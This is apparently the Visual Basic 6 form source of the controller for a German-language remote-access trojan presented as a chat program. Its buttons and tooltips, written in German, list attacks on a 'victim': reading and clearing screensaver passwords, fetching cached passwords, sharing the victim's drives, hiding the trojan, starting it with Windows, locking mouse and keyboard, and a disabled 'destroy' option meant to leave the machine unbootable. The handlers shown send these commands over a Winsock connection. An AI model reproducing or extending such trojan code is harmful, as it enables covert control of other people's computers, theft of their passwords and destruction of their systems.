VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "thE_iNviNciblE's Chat 2.60 Beta"
   ClientHeight    =   9900
   ClientLeft      =   45
   ClientTop       =   1515
   ClientWidth     =   12060
   Icon            =   "Server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9900
   ScaleWidth      =   12060
   StartUpPosition =   2  'CenterScreen
   Begin RichTextLib.RichTextBox Text3 
      Height          =   1695
      Left            =   3120
      TabIndex        =   100
      Top             =   3480
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   2990
      _Version        =   393217
      BackColor       =   12648384
      ScrollBars      =   2
      TextRTF         =   $"Server.frx":030A
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin RichTextLib.RichTextBox Text2 
      Height          =   1695
      Left            =   3120
      TabIndex        =   99
      Top             =   600
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   2990
      _Version        =   393217
      ScrollBars      =   2
      TextRTF         =   $"Server.frx":038E
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.CheckBox BildPWD 
      Caption         =   "Bildschirmschoner PWD"
      Height          =   255
      Left            =   2760
      TabIndex        =   98
      Top             =   8880
      Width           =   615
   End
   Begin VB.CheckBox start 
      Caption         =   "start"
      Height          =   195
      Left            =   1800
      TabIndex        =   97
      Top             =   8880
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.CheckBox fenster 
      Caption         =   "fensterschließen"
      Height          =   255
      Left            =   2160
      TabIndex        =   96
      Top             =   9120
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox startbutton 
      Caption         =   "Startbutton "
      Height          =   195
      Left            =   3480
      TabIndex        =   95
      Top             =   9000
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.CheckBox mauss 
      Caption         =   "mausi"
      Height          =   195
      Left            =   3960
      TabIndex        =   94
      Top             =   9000
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.CheckBox keyboard 
      Caption         =   "keyboard"
      Height          =   195
      Left            =   1200
      TabIndex        =   93
      Top             =   9120
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox mausANAUS 
      Caption         =   "Check8"
      Height          =   255
      Left            =   3240
      TabIndex        =   92
      Top             =   2640
      Value           =   1  'Checked
      Width           =   615
   End
   Begin VB.CheckBox task 
      Caption         =   "Check8"
      Height          =   255
      Left            =   8520
      TabIndex        =   91
      Top             =   4560
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.CheckBox status1 
      Caption         =   "Check8"
      Height          =   255
      Left            =   3120
      TabIndex        =   89
      Top             =   2400
      Value           =   1  'Checked
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox chat 
      Caption         =   "chatmodus"
      Height          =   255
      Left            =   3240
      TabIndex        =   88
      Top             =   2760
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Cached Passwords !!!!"
      Height          =   495
      Left            =   4560
      TabIndex        =   87
      Top             =   8400
      Width           =   2175
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Befehle Senden"
      Height          =   495
      Left            =   9480
      TabIndex        =   86
      ToolTipText     =   "Hiermit kann man benutzerdefinierte befehle senden"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CheckBox Check7 
      Caption         =   "Check7"
      Height          =   255
      Left            =   5520
      TabIndex        =   85
      Top             =   2760
      Visible         =   0   'False
      Width           =   1575
   End
   Begin VB.CommandButton Command79 
      Caption         =   "MAUS TASTERTUR AUS"
      Height          =   495
      Left            =   9480
      TabIndex        =   84
      ToolTipText     =   "Beim anderen Rechner geht nix mehr"
      Top             =   8880
      Width           =   2535
   End
   Begin VB.CommandButton Command80 
      Caption         =   "Startbutton Land"
      Height          =   495
      Left            =   8160
      TabIndex        =   83
      Top             =   4080
      Width           =   1215
   End
   Begin VB.CheckBox empfuhr 
      Caption         =   "datum"
      Height          =   255
      Left            =   5880
      TabIndex        =   82
      Top             =   2400
      Value           =   1  'Checked
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox desktop 
      Caption         =   "desktop"
      Height          =   375
      Left            =   13920
      TabIndex        =   79
      Top             =   8040
      Width           =   855
   End
   Begin VB.CommandButton Command58 
      Caption         =   "DESKTOP   VERSTECKEN"
      Height          =   495
      Left            =   8160
      TabIndex        =   78
      Top             =   480
      Width           =   1215
   End
   Begin VB.Timer Timer3 
      Interval        =   10
      Left            =   4320
      Top             =   0
   End
   Begin VB.CommandButton Command56 
      Caption         =   "Keyboard spinnt"
      Height          =   495
      Left            =   1680
      TabIndex        =   74
      TabStop         =   0   'False
      ToolTipText     =   "Tastertur drückt tasten"
      Top             =   6600
      Width           =   1335
   End
   Begin VB.CommandButton Command54 
      Caption         =   "Maus VIRI  AN"
      Height          =   495
      Left            =   3120
      TabIndex        =   73
      TabStop         =   0   'False
      ToolTipText     =   "Alles was sich unter der maus befindet wird geöffnet"
      Top             =   6600
      Width           =   1335
   End
   Begin VB.CommandButton Command52 
      Caption         =   "Fenster schließen AN"
      Height          =   495
      Left            =   1680
      TabIndex        =   72
      TabStop         =   0   'False
      ToolTipText     =   "Alle Aktiven Fenster werden geschlossen"
      Top             =   7200
      Width           =   2775
   End
   Begin VB.CommandButton Command51 
      Caption         =   "Startbutton AUS"
      Height          =   495
      Left            =   4560
      TabIndex        =   70
      TabStop         =   0   'False
      ToolTipText     =   "Deaktiviert den Startbutton bis neustart"
      Top             =   7200
      Width           =   2175
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Startbutton verstecken"
      Height          =   495
      Left            =   4560
      TabIndex        =   69
      TabStop         =   0   'False
      ToolTipText     =   "Versteckt den Startbutton"
      Top             =   6600
      Width           =   2175
   End
   Begin VB.CommandButton FreigabeD 
      BackColor       =   &H8000000B&
      Caption         =   "D:\Freigeben"
      Height          =   495
      Left            =   6840
      MaskColor       =   &H000000FF&
      MouseIcon       =   "Server.frx":0412
      Style           =   1  'Graphical
      TabIndex        =   68
      TabStop         =   0   'False
      ToolTipText     =   "Freigeben von dem Laufwerk D:\ (NEUSTARTEN ERFORDERLICH)"
      Top             =   2880
      UseMaskColor    =   -1  'True
      Width           =   1215
   End
   Begin VB.CommandButton Command49 
      Caption         =   "Caps"
      Height          =   495
      Left            =   6840
      TabIndex        =   67
      TabStop         =   0   'False
      ToolTipText     =   "Schaltet die Caps an / aus"
      Top             =   480
      Width           =   1215
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Doppelklick"
      Height          =   495
      Left            =   10800
      TabIndex        =   66
      TabStop         =   0   'False
      ToolTipText     =   "Doppelklickgeschwindigkeit aus / ein"
      Top             =   480
      Width           =   1215
   End
   Begin VB.CommandButton Command12 
      Caption         =   "BEEP AN"
      Height          =   495
      Left            =   5280
      TabIndex        =   65
      TabStop         =   0   'False
      Top             =   9000
      Width           =   1455
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Startbutton FLY"
      Height          =   495
      Left            =   6840
      TabIndex        =   63
      TabStop         =   0   'False
      Top             =   4080
      Width           =   1215
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Sendkeys"
      Height          =   495
      Left            =   120
      TabIndex        =   62
      TabStop         =   0   'False
      ToolTipText     =   "Öffnet viele viele viele Anwendungen"
      Top             =   7200
      Width           =   1455
   End
   Begin VB.CheckBox Check6 
      Caption         =   "Mauszeig"
      Height          =   375
      Left            =   13200
      TabIndex        =   61
      Top             =   8160
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CheckBox Check5 
      Caption         =   "BEEP"
      Height          =   255
      Left            =   12360
      TabIndex        =   60
      Top             =   8160
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox Check4 
      Caption         =   "Doppel"
      Height          =   255
      Left            =   13200
      TabIndex        =   59
      Top             =   8520
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CheckBox Check3 
      Caption         =   "Monitor"
      Height          =   255
      Left            =   12360
      TabIndex        =   58
      Top             =   8400
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Monitor AUS"
      Height          =   495
      Left            =   8160
      TabIndex        =   57
      TabStop         =   0   'False
      ToolTipText     =   "Schaltet den Monitor ein / aus"
      Top             =   7080
      Width           =   1215
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Caps"
      Height          =   375
      Left            =   12360
      TabIndex        =   56
      Top             =   8640
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   6000
      Top             =   0
   End
   Begin VB.CommandButton Command48 
      Caption         =   "Mausbewgen An"
      Height          =   495
      Left            =   120
      TabIndex        =   55
      TabStop         =   0   'False
      ToolTipText     =   "Schaltet das Bewegen wieder ab"
      Top             =   6600
      Width           =   1455
   End
   Begin VB.CommandButton Command46 
      Caption         =   "WinOEM"
      Height          =   495
      Left            =   10800
      TabIndex        =   54
      TabStop         =   0   'False
      ToolTipText     =   "Blendet die Taskbar wieder aus"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Taskbar aus"
      Height          =   495
      Left            =   10800
      TabIndex        =   53
      TabStop         =   0   'False
      ToolTipText     =   "Blendet die taskbar wieder ein"
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton Command34 
      Caption         =   "Drucken "
      Height          =   540
      Left            =   6840
      TabIndex        =   52
      TabStop         =   0   'False
      ToolTipText     =   "Druckt etwas *G*"
      Top             =   8280
      Width           =   2535
   End
   Begin VB.CommandButton Command37 
      Caption         =   "Festplattengröße"
      Enabled         =   0   'False
      Height          =   495
      Left            =   9480
      TabIndex        =   51
      TabStop         =   0   'False
      Top             =   9480
      Visible         =   0   'False
      Width           =   2535
   End
   Begin VB.CommandButton Command42 
      Caption         =   "Bildschirmschoner PW AUS"
      Height          =   495
      Left            =   9480
      TabIndex        =   50
      TabStop         =   0   'False
      ToolTipText     =   "Bildschirmschoner Passwort AUS"
      Top             =   6480
      Width           =   2535
   End
   Begin VB.CommandButton Command44 
      Caption         =   "Bildschirmschoner PW löschen"
      Height          =   495
      Left            =   9480
      TabIndex        =   49
      TabStop         =   0   'False
      ToolTipText     =   "Bildschirmschoner Passwort löschen"
      Top             =   5880
      Width           =   2535
   End
   Begin VB.CommandButton Command45 
      Caption         =   "Zufälliges Kennwort"
      Height          =   495
      Left            =   9480
      TabIndex        =   48
      TabStop         =   0   'False
      ToolTipText     =   "fälliges Kennwort"
      Top             =   7680
      Width           =   2535
   End
   Begin VB.CommandButton Command13 
      Caption         =   "ZERSTÖREN"
      Enabled         =   0   'False
      Height          =   495
      Left            =   6840
      TabIndex        =   47
      TabStop         =   0   'False
      ToolTipText     =   "OPFER = TOT (KEIN BOOTEN MEHR)"
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton internetip 
      Caption         =   "INTERNET IP"
      Height          =   495
      Left            =   9480
      TabIndex        =   46
      TabStop         =   0   'False
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Bildschirmschoner PW Anzeigen"
      Height          =   495
      Left            =   9480
      TabIndex        =   45
      TabStop         =   0   'False
      ToolTipText     =   "Zeigt das Bildschirmschoner Passwort"
      Top             =   5280
      Width           =   2535
   End
   Begin VB.CommandButton Command35 
      Caption         =   "insecure"
      Height          =   495
      Left            =   8160
      TabIndex        =   44
      TabStop         =   0   'False
      Top             =   8880
      Width           =   1215
   End
   Begin VB.CommandButton Command38 
      Caption         =   "IE TITLE"
      Height          =   495
      Left            =   6840
      TabIndex        =   43
      TabStop         =   0   'False
      ToolTipText     =   "Beim Internet Explorer einen Title einfügen"
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command39 
      Caption         =   "Benutzer-Daten"
      Height          =   495
      Left            =   8040
      TabIndex        =   42
      TabStop         =   0   'False
      ToolTipText     =   "Zeigt einem die Benutzerdaten an"
      Top             =   5880
      Width           =   1335
   End
   Begin VB.CommandButton Command40 
      Caption         =   "Mit Windows starten"
      Height          =   495
      Left            =   4560
      TabIndex        =   41
      TabStop         =   0   'False
      ToolTipText     =   "Client wird mit Windows gestartet"
      Top             =   7800
      Width           =   2175
   End
   Begin VB.CommandButton Command30 
      Caption         =   "Bildschirmschoner AN"
      Height          =   495
      Left            =   9480
      TabIndex        =   40
      TabStop         =   0   'False
      ToolTipText     =   "schaltet den Bildschirmschoner beim Opfer an"
      Top             =   7080
      Width           =   2535
   End
   Begin VB.CommandButton Command29 
      Caption         =   "Disconnect"
      Height          =   495
      Left            =   9480
      TabIndex        =   39
      TabStop         =   0   'False
      ToolTipText     =   "geht aus dem Internet"
      Top             =   4080
      Width           =   1215
   End
   Begin VB.CommandButton Command28 
      Caption         =   "Autoconnect off"
      Height          =   495
      Left            =   10800
      TabIndex        =   38
      TabStop         =   0   'False
      ToolTipText     =   "schaltet das Autoconnecten wieder aus"
      Top             =   4080
      Width           =   1215
   End
   Begin VB.CommandButton Command27 
      Caption         =   "Autoconnect"
      Height          =   495
      Left            =   10800
      TabIndex        =   37
      TabStop         =   0   'False
      ToolTipText     =   "wählt sich selbständig in das Internet ein (falls Passwort eingetragen) alle 50 Ms"
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Secure"
      Height          =   495
      Left            =   6840
      TabIndex        =   36
      TabStop         =   0   'False
      ToolTipText     =   "lässt alle Laufwerke verschwinden nach dem Neustart (auch im Explorer)"
      Top             =   8880
      Width           =   1215
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Format A:"
      Height          =   495
      Left            =   8160
      TabIndex        =   35
      TabStop         =   0   'False
      ToolTipText     =   "Formatier das Diskettenlaufwerk (Dialog)"
      Top             =   7680
      Width           =   1215
   End
   Begin VB.CommandButton WORKGROUP 
      BackColor       =   &H8000000B&
      Caption         =   "WORKGROUP SETZEN"
      Height          =   495
      Left            =   9480
      MaskColor       =   &H00008000&
      MouseIcon       =   "Server.frx":071C
      MousePointer    =   99  'Custom
      Style           =   1  'Graphical
      TabIndex        =   34
      TabStop         =   0   'False
      ToolTipText     =   "Setzt die Workgroup auf I'Ve hack you (NEUSTART ERFORDERLICH)"
      Top             =   2880
      Width           =   1215
   End
   Begin VB.CommandButton Freigabe 
      BackColor       =   &H8000000B&
      Caption         =   "C:\ Freigeben"
      Height          =   495
      Left            =   8160
      MouseIcon       =   "Server.frx":0A26
      MousePointer    =   99  'Custom
      Style           =   1  'Graphical
      TabIndex        =   33
      TabStop         =   0   'False
      ToolTipText     =   "Freigeben von dem Laufwerk C:\ (NEUSTART ERFORDERLICH)"
      Top             =   2880
      Width           =   1215
   End
   Begin VB.CommandButton Command10 
      Caption         =   "schreiben"
      Height          =   495
      Left            =   11415
      TabIndex        =   32
      TabStop         =   0   'False
      ToolTipText     =   "schreibt den Neuen Rechnernamen I'Ve Hack YOU"
      Top             =   2880
      Width           =   615
   End
   Begin VB.CommandButton Command23 
      Caption         =   "lesen"
      Height          =   495
      Left            =   10800
      TabIndex        =   31
      TabStop         =   0   'False
      ToolTipText     =   "Zeigt den Akuellen Rechnernamen an"
      Top             =   2880
      Width           =   615
   End
   Begin VB.CommandButton Command25 
      Caption         =   "Laufwerke anzeigen "
      Height          =   495
      Left            =   9480
      TabIndex        =   30
      TabStop         =   0   'False
      ToolTipText     =   "zeigt alle Laufwerke des Opfers an"
      Top             =   8280
      Width           =   2535
   End
   Begin VB.CommandButton Command26 
      Caption         =   "Trojan verstecken"
      Height          =   495
      Left            =   6840
      TabIndex        =   29
      TabStop         =   0   'False
      ToolTipText     =   "Das Opfer sieht das Programm nicht mehr"
      Top             =   7080
      Width           =   1215
   End
   Begin VB.CommandButton Command31 
      Caption         =   "Trojan zeigen"
      Height          =   495
      Left            =   6840
      TabIndex        =   28
      TabStop         =   0   'False
      Top             =   7680
      Width           =   1215
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Reboot"
      Height          =   495
      Left            =   1680
      TabIndex        =   27
      TabStop         =   0   'False
      ToolTipText     =   "Startet den Rechner des Opfers neu"
      Top             =   8280
      Width           =   1335
   End
   Begin VB.CommandButton Command5 
      Caption         =   "MSG SCHREIBEN"
      Height          =   495
      Left            =   9480
      TabIndex        =   26
      TabStop         =   0   'False
      ToolTipText     =   "schickt eine MSG"
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton malen 
      Caption         =   "Malen"
      Height          =   495
      Left            =   8160
      TabIndex        =   25
      TabStop         =   0   'False
      ToolTipText     =   "Malen des Desktops (Endlos)"
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Browser Startseite"
      Height          =   495
      Left            =   8160
      TabIndex        =   24
      TabStop         =   0   'False
      ToolTipText     =   "ändert die Browser Startseite"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton Command6 
      Caption         =   "FUNNY / Beenden"
      Height          =   495
      Left            =   6840
      TabIndex        =   23
      TabStop         =   0   'False
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton Command32 
      Caption         =   "Shutdown"
      Height          =   495
      Left            =   120
      TabIndex        =   22
      TabStop         =   0   'False
      Top             =   8280
      Width           =   1455
   End
   Begin VB.CommandButton Command33 
      Caption         =   "Logoff"
      Height          =   495
      Left            =   3120
      TabIndex        =   21
      TabStop         =   0   'False
      Top             =   8280
      Width           =   1335
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   120
      TabIndex        =   20
      Text            =   "Keine Verbindung zum Client"
      ToolTipText     =   "Connection Status"
      Top             =   5760
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.Frame Frame1 
      Caption         =   "Clients"
      Height          =   2535
      Left            =   0
      TabIndex        =   17
      Top             =   1560
      Width           =   3015
      Begin VB.ListBox List1 
         Height          =   2010
         Left            =   120
         TabIndex        =   18
         TabStop         =   0   'False
         Top             =   360
         Width           =   2775
      End
   End
   Begin VB.ListBox List2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00E0E0E0&
      Height          =   1425
      ItemData        =   "Server.frx":0D30
      Left            =   120
      List            =   "Server.frx":0D32
      MultiSelect     =   2  'Extended
      TabIndex        =   16
      TabStop         =   0   'False
      Top             =   0
      Width           =   2895
   End
   Begin VB.TextBox Text4 
      Height          =   375
      Left            =   2520
      Locked          =   -1  'True
      TabIndex        =   15
      Text            =   "5"
      ToolTipText     =   "Gibt den Port an"
      Top             =   4080
      Width           =   495
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      ToolTipText     =   "Hier bitte den Rechnernamen oder IP eintragen"
      Top             =   4560
      Width           =   2775
   End
   Begin VB.CommandButton Command36 
      Caption         =   "&Connection"
      Enabled         =   0   'False
      Height          =   375
      Left            =   240
      TabIndex        =   14
      Top             =   4080
      Width           =   2175
   End
   Begin VB.OptionButton Option2 
      Caption         =   "640 x 480"
      Height          =   255
      Left            =   6840
      TabIndex        =   13
      Top             =   5280
      Width           =   1095
   End
   Begin VB.OptionButton Option1 
      Caption         =   "800 x 600"
      Height          =   255
      Index           =   1
      Left            =   6840
      TabIndex        =   12
      Top             =   5520
      Value           =   -1  'True
      Width           =   1095
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1024 x 768"
      Height          =   255
      Index           =   2
      Left            =   6840
      TabIndex        =   11
      Top             =   5760
      Width           =   1095
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1152 x 864"
      Height          =   255
      Index           =   3
      Left            =   6840
      TabIndex        =   10
      Top             =   6000
      Width           =   1095
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Bildschirmgröße Anzeigen"
      Height          =   495
      Left            =   6840
      TabIndex        =   9
      TabStop         =   0   'False
      ToolTipText     =   "Auflösung des Bildschirms des Opfers"
      Top             =   6480
      Width           =   2535
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Close"
      Height          =   495
      Left            =   10080
      TabIndex        =   8
      TabStop         =   0   'False
      ToolTipText     =   "schließt das Cd - ROM wieder "
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton open 
      Caption         =   "Open"
      Height          =   495
      Left            =   9480
      TabIndex        =   7
      TabStop         =   0   'False
      ToolTipText     =   "öffnet das CD-ROM"
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Open Browser"
      Height          =   495
      Left            =   8160
      TabIndex        =   6
      TabStop         =   0   'False
      ToolTipText     =   "zu www.symantec.com"
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Minmieren"
      Height          =   495
      Left            =   8040
      TabIndex        =   5
      TabStop         =   0   'False
      ToolTipText     =   "Minimiert alle Anwendungen bei dem Opfer"
      Top             =   5280
      Width           =   1335
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   5400
      Top             =   0
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   375
      Left            =   5760
      TabIndex        =   4
      Top             =   2400
      Visible         =   0   'False
      Width           =   1095
   End
   Begin MSWinsockLib.Winsock W 
      Left            =   4920
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Send"
      Height          =   375
      Left            =   4080
      TabIndex        =   2
      TabStop         =   0   'False
      ToolTipText     =   "ALT + S reicht auch aus"
      Top             =   2400
      Width           =   1575
   End
   Begin VB.Label Label10 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   90
      Top             =   9480
      Visible         =   0   'False
      Width           =   11895
   End
   Begin VB.Label Label9 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "FUNNY II"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008000&
      Height          =   375
      Left            =   120
      TabIndex        =   81
      Top             =   6120
      Width           =   6615
   End
   Begin VB.Label Label8 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "STARTEN usw...... !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004000&
      Height          =   375
      Left            =   120
      TabIndex        =   80
      Top             =   7800
      Width           =   4335
   End
   Begin VB.Label Label7 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "NETZWERK && INTERNET"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   375
      Left            =   6840
      TabIndex        =   77
      Top             =   2400
      Width           =   5175
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "SYSTEM"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   6840
      TabIndex        =   76
      Top             =   4800
      Width           =   5175
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "FUNNY"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008000&
      Height          =   375
      Left            =   6840
      TabIndex        =   75
      Top             =   0
      Width           =   5175
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Proudly presented by  thE_iNviNciblE"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   735
      Left            =   3120
      TabIndex        =   71
      ToolTipText     =   "Der Programmierer des Programms"
      Top             =   5280
      Width           =   3540
   End
   Begin VB.Label Label3 
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Hier kann man den Rechnernamen (LAN)  oder die IP eintragen....."
      ForeColor       =   &H000000FF&
      Height          =   435
      Left            =   120
      TabIndex        =   64
      Top             =   5040
      Width           =   2775
   End
   Begin VB.Label ConnectionState 
      Caption         =   "Status"
      Height          =   255
      Left            =   120
      TabIndex        =   19
      ToolTipText     =   "Zeigt einem an ob es mit dem Connecten geklappt hat"
      Top             =   5520
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Empfangen !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   3
      Top             =   3000
      Width           =   3495
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Senden !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   1
      Top             =   120
      Width           =   3495
   End
   Begin VB.Menu Befehl 
      Caption         =   "&Befehle"
      Begin VB.Menu spezial 
         Caption         =   "Spezial"
         Shortcut        =   {F2}
      End
      Begin VB.Menu withtime 
         Caption         =   "Mit Uhrzeit !!!!"
         Shortcut        =   {F3}
      End
      Begin VB.Menu chatmodus 
         Caption         =   "Chatmodus !!!"
         Shortcut        =   {F4}
      End
      Begin VB.Menu mehrfunk 
         Caption         =   "Mehr funktionen"
         Shortcut        =   {F5}
      End
   End
   Begin VB.Menu helpful 
      Caption         =   "&Nützliches"
      Begin VB.Menu icqipget 
         Caption         =   "ICQ IP Holen !!!"
      End
      Begin VB.Menu icqip 
         Caption         =   "ICQ Webpager"
      End
   End
   Begin VB.Menu help 
      Caption         =   "&HILFE"
      Begin VB.Menu how 
         Caption         =   "WIE GEHT DAS PROGRAMM ?"
      End
      Begin VB.Menu Author 
         Caption         =   "Author"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'************************** thE_iNviNciblE ALIAS *****************************************************
'*
'*                             Have fun !!!!
'*
'*     Author   : thE_iNviNciblE
'*
'*     Website  : http://www.the-invincible4ever.de.vu
'*
'*     e -Mail  : thE_iNviNciblE@ gmx.de
'*
'*     icq      : 114397162
'*
'***********************************************************************************************
Dim a

Private Sub chatmodus_Click()
If chat.Value = 1 Then
    chat.Value = 0
    Exit Sub
End If
If chat.Value = 0 Then
    chat.Value = 1
    Exit Sub
End If
End Sub

Private Sub Command10_Click()
jan = InputBox("Bitte geben sie den Neuen Rechnernamen ein *G* !!")
W.SendData jan & "|" & "compu"
End Sub

Private Sub Command10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Ändert den Aktuellen Computernamen in I've HAck uuuuuuu"
End Sub

Private Sub Command11_Click()
If task.Value = 1 Then
    task.Value = 0
    Command11.Caption = "Taksbar an"
    W.SendData "taskan"
    Exit Sub
End If
If task.Value = 0 Then
    task.Value = 1
    Command11.Caption = "Taskbar aus"
    W.SendData "taskaus"
    Exit Sub
End If
Exit Sub
End Sub

Private Sub Command11_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Macht die Taskbar wieder an / aus"
End Sub

Private Sub Command12_Click()
If Check5.Value = 0 Then
    Check5.Value = 1
    Command12.Caption = "BEEP AN"
    W.SendData "beepon"
    Exit Sub
End If
If Check5.Value = 1 Then
    Check5.Value = 0
    Command12.Caption = "BEEP AUS"
    W.SendData "beepoff"
    Exit Sub
End If
End Sub

Private Sub Command12_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Funzt nur wenn die DLL auch da ist BEEEEEEEPPPPPPPPPPPPPPPPPPPP *nerv*"
